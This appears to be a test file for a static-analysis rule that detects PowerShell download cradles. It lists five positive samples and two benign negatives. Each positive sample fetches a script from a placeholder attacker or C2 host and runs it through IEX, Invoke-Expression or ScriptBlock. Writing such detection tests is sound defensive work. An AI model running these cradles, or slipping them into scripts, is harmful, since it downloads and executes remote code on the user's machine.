# ruleid: ps-download-cradle-iex
IEX (New-Object Net.WebClient).DownloadString('http://evil.example.com/stage2.ps1')

# ruleid: ps-download-cradle-iex
Invoke-Expression (Invoke-WebRequest -Uri 'https://attacker.example.com/payload.ps1' -UseBasicParsing).Content

# ruleid: ps-download-cradle-iex
$code = (New-Object System.Net.WebClient).DownloadString('https://c2.example.com/loader.ps1')
IEX $code

# ruleid: ps-download-cradle-iex
[ScriptBlock]::Create((New-Object Net.WebClient).DownloadString('http://10.0.0.1/run.ps1')).Invoke()

# ruleid: ps-download-cradle-iex
Invoke-Expression (irm https://evil.example.com/payload)

# ok: ps-download-cradle-iex
$html = Invoke-WebRequest -Uri 'https://www.example.com'
Write-Host $html.StatusCode

# ok: ps-download-cradle-iex
IEX "Write-Host 'Hello World'"
